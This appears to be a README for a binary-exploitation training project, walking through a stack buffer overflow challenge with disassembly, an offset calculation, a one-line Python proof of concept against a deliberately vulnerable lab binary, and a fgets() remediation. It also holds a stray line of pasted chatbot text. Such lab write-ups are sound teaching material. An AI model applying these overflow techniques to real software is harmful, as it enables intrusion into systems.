# Hole-In-Bin

## Introduction

Hole-In-Bin is a hands-on learning project focused on reverse engineering
and binary exploitation. The project provides a set of vulnerable binaries
designed to develop a practical understanding of low-level system mechanics,
memory corruption, and common binary vulnerabilities.

## Objectives

- Understand x86 assembly and low-level program execution.
- Analyze stack and heap memory.
- Understand stack frames and memory layouts.
- Identify and analyze different binary vulnerabilities.
- Understand buffer overflow and format string vulnerabilities.
- Practice debugging and binary analysis using GDB/PEDA.
- Develop practical binary exploitation skills in an authorized lab environment.

## Tools

- GDB / PEDA
- Ghidra (Listing View only)
- Radare2
- Python

Here is the Markdown formatted cleanly for your README file, with proper code block formatting and clear headers:

## Challenges

### ex00 - Stack Buffer Overflow

#### Objective

Modify the `modified` variable to reach the target success message:

> `you have changed the 'modified' variable`

---

#### Analysis

Analyzing the `main` function disassembly using **GDB/PEDA**:

```assembly
gdb-peda$ pdisass main

0x080483f4 <+0>:     push   ebp
0x080483f5 <+1>:     mov    ebp,esp
0x080483f7 <+3>:     and    esp,0xfffffff0
0x080483fa <+6>:     sub    esp,0x60
0x080483fd <+9>:     mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <+17>:    lea    eax,[esp+0x1c]
0x08048409 <+21>:    mov    DWORD PTR [esp],eax
0x0804840c <+24>:    call   gets@plt
0x08048411 <+29>:    mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <+33>:    test   eax,eax
0x08048417 <+35>:    je     0x8048427

```

**Key Layout Observations:**

* Stack frame allocation: `sub esp, 0x60`
* Input buffer start address: `esp + 0x1c`
* Target variable (`modified`) location: `esp + 0x5c`

---

#### Vulnerability

The program uses the unsafe function `gets()` (`call gets@plt`). Because `gets()` performs no bounds checking on input length, an attacker can write past the allocated buffer boundary and overwrite adjacent stack variables.

---

#### Exploitation

**Offset Calculation:**

```text
0x5c - 0x1c = 0x40 = 64 bytes
```

**Proof of Concept (PoC):**

```bash
python -c 'print "A" * 64 + "B"' | ./bin
```

**Result:**

```bash
user@hole-in-bin:/opt/hole-in-bin/ex00$ python -c 'print "A" * 64 + "B"' | ./bin
you have changed the 'modified' variable
user@hole-in-bin:/opt/hole-in-bin/ex00$ 
```

The 64-byte padding fills the space between the start of the buffer and the `modified` variable. The subsequent non-zero byte (`B`) overwrites `modified`, satisfying the validation check (`test eax, eax`) and triggering the success message.

---

#### Remediation

1. **Use Bounded Functions:** Replace the unsafe `gets()` function with a safe input function:
```c
fgets(buffer, sizeof(buffer), stdin);
```
